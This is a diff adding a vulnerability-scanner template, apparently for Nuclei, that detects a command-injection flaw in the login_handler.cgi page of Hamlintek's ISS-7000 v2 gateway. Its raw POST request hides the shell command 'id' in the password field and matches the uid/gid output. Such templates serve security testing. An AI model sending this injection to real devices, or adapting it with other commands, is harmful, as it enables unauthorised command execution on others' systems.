@@ -1,0 +1,22 @@
+id: hamlintek-ISS-7000-login_handler-rce
+
+info:
+  name: 瀚霖科技股份有限公司ISS-7000 v2网关login_handler.cgi存在命令执行漏洞
+  author: hamlintek
+  severity: critical
+  tags: hamlintek
+
+http:
+  - raw:
+      - |
+        POST /login_handler.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin;id;&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
